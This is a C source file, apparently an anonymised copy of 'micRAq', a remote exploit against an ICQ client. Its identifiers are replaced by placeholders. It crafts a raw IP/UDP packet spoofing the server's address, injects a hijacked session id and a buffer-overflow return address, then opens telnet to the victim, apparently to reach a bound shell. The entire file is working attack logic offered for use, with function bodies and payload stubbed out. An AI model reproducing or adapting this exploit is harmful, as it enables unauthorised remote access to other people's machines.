
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_8__ TYPE_4__ ;
typedef struct TYPE_7__ TYPE_3__ ;
typedef struct TYPE_6__ TYPE_2__ ;
typedef struct TYPE_5__ TYPE_1__ ;


typedef int u_short ;
struct udphdr {scalar_t__ check; void* len; void* dest; void* source; } ;
struct TYPE_8__ {int* ver; int* cmd; scalar_t__* check; scalar_t__* UIN; scalar_t__* seq2; scalar_t__* seq; int * session; scalar_t__ zero; } ;
struct srv_net_icq_pak {int data; TYPE_4__ head; } ;
struct TYPE_5__ {void* s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct TYPE_7__ {void* s_addr; } ;
struct TYPE_6__ {void* s_addr; } ;
struct ip {int ip_hl; int ip_v; int ip_ttl; int ip_sum; TYPE_3__ ip_dst; TYPE_2__ ip_src; int ip_p; void* ip_id; scalar_t__ ip_off; scalar_t__ ip_tos; void* ip_len; } ;
typedef int hincl ;
typedef int RECV_MESSAGE_PTR ;


 int VAR_0 ;
 int VAR_1 ;
 unsigned long VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (int ,unsigned long*) ;
 int FUNC_2 (int) ;
 int FUNC_3 (char*,char*,char*,int ,int *) ;
 int FUNC_4 (int) ;
 int FUNC_5 (int ) ;
 int FUNC_6 () ;
 scalar_t__ FUNC_7 (char*) ;
 void* FUNC_8 (int) ;
 int FUNC_9 (int *,int) ;
 void* FUNC_10 (char*) ;
 char* FUNC_11 (int) ;
 int FUNC_12 (char*,int ,int) ;
 int FUNC_13 (char*) ;
 int FUNC_14 (char*,...) ;
 scalar_t__ FUNC_15 (int,char*,int,int ,struct sockaddr*,int) ;
 scalar_t__ FUNC_16 (int,int ,int ,int*,int) ;
 int FUNC_17 (int) ;
 int FUNC_18 (int ,int ,int ) ;
 int VAR_9 ;
 int FUNC_19 (char*) ;
 int FUNC_20 (char*,int *,int) ;
 unsigned long FUNC_21 (char*,int *,int) ;

int FUNC_22(int VAR_10, char *VAR_11[])
{
        int VAR_12, VAR_13, VAR_14 = 1;
        unsigned long VAR_15 = VAR_2;
        struct sockaddr_in VAR_16;
        struct ip *VAR_17;
        struct udphdr *VAR_18;
        char *VAR_19, VAR_20[3];
        struct srv_net_icq_pak *VAR_21;
        RECV_MESSAGE_PTR VAR_22;

        FUNC_14("\n\t[ [ micRAq ] - by tHE rECIdjVO <recidjvo@pkcrew.org> ]\n\t\tPacket Knights - http://www.pkcrew.org/\n\n");

        if((VAR_10 != 5) && (VAR_10 != 6)) {
                FUNC_14("usage: %s <client_ip> <client_port> <server_ip> <hex_session> [buffer]\n\n", VAR_11[0]);
                FUNC_4(-1);
        }

        if(FUNC_19(VAR_11[4]) != 8) {
                FUNC_14("Error: <session> must be 8 digits exadecimal number.\n\n");
                FUNC_4(-1);
        }

        if(VAR_10 == 6) {
                VAR_15 = FUNC_21(VAR_11[5], ((void*)0), 16);
        }
        FUNC_14("Using buffer address: 0x%x\n\n", VAR_15);


        if((VAR_12 = FUNC_18(VAR_0, VAR_8, VAR_5)) < 0) {
                FUNC_13("socket()");
                FUNC_4(-1);
        }

        if(FUNC_16(VAR_12, VAR_4, VAR_7, &VAR_14, sizeof(VAR_14)) < 0) {
                FUNC_13("setsockopt()");
                FUNC_2(VAR_12);
                FUNC_4(-1);
        }


        VAR_19 = FUNC_11(sizeof(struct ip) + sizeof(struct udphdr) + 1024);
        VAR_17 = (struct ip *)VAR_19;
        VAR_18 = (struct udphdr *)(VAR_19 + sizeof(struct ip));
        VAR_21 = (struct srv_net_icq_pak *)(VAR_19 + sizeof(struct ip) + sizeof(struct udphdr));


        FUNC_12(VAR_19, 0, sizeof(struct ip) + sizeof(struct udphdr) + 1024);


        VAR_16.sin_family = VAR_0;
        VAR_16.sin_addr.s_addr = FUNC_10(VAR_11[1]);
        VAR_17->ip_len = FUNC_8(sizeof(struct ip) + sizeof(struct udphdr) + 1024);
        VAR_17->ip_hl = 5;
        VAR_17->ip_v = 4;
        VAR_17->ip_ttl = 255;
        VAR_17->ip_tos = 0;
        VAR_17->ip_off = 0;
        VAR_17->ip_id = FUNC_8(FUNC_6());
        VAR_17->ip_p = VAR_6;
        VAR_17->ip_src.s_addr = FUNC_10(VAR_11[3]);
        VAR_17->ip_dst.s_addr = FUNC_10(VAR_11[1]);
        VAR_17->ip_sum = FUNC_9((u_short*)VAR_17, sizeof(struct ip));
        VAR_18->source = FUNC_8(VAR_3);
        VAR_18->dest = FUNC_8(FUNC_0(VAR_11[2]));
        VAR_18->len = FUNC_8(sizeof(struct udphdr) + 1024);
        VAR_18->check = 0;


        VAR_21->head.ver[0] = 5;
        VAR_21->head.ver[1] = 0;
        VAR_21->head.zero = 0;

        for(VAR_13 = 0; VAR_13 < 8; VAR_13 += 2) {
                VAR_20[0] = VAR_11[4][VAR_13];
                VAR_20[1] = VAR_11[4][VAR_13 + 1];
                VAR_20[2] = '\0';

                VAR_21->head.session[VAR_13 / 2] = FUNC_20(VAR_20, ((void*)0), 16);
        }

        VAR_21->head.cmd[0] = 4;
        VAR_21->head.cmd[1] = 1;
        VAR_21->head.seq[0] = 0;
        VAR_21->head.seq[1] = 0;
        VAR_21->head.seq2[0] = 0;
        VAR_21->head.seq2[1] = 0;
        VAR_21->head.UIN[0] = 0;
        VAR_21->head.UIN[1] = 0;
        VAR_21->head.UIN[2] = 0;
        VAR_21->head.UIN[3] = 0;
        VAR_21->head.check[0] = 0;
        VAR_21->head.check[1] = 0;
        VAR_21->head.check[2] = 0;
        VAR_21->head.check[3] = 0;


        FUNC_1(VAR_21->data, &VAR_15);


        if(FUNC_15(VAR_12, VAR_19, sizeof(struct ip) + sizeof(struct udphdr) + 1024, 0, (struct sockaddr *)&VAR_16, sizeof(struct sockaddr_in)) < 0) {
                FUNC_13("sendto()");
                FUNC_2(VAR_12);
                FUNC_4(-1);
        }


        FUNC_2(VAR_12);


        FUNC_17(1);


        if(FUNC_7(VAR_11[1]) < 0) {
                FUNC_14("Unable to connect :\\\n");
                FUNC_4(-1);
        }


        FUNC_17(1);
        FUNC_14("\t\"To be");
        FUNC_5(VAR_9);
        FUNC_17(2);
        FUNC_14(", or not to be.\n");
        FUNC_17(1);
        FUNC_14("\t This is the question.\"\n");
        FUNC_17(1);
        FUNC_14("\t\t\t(William Shakespeare)\n\n");


        FUNC_3("/usr/bin/telnet", "telnet", VAR_11[1], VAR_1, ((void*)0));


        FUNC_4(-1);
}
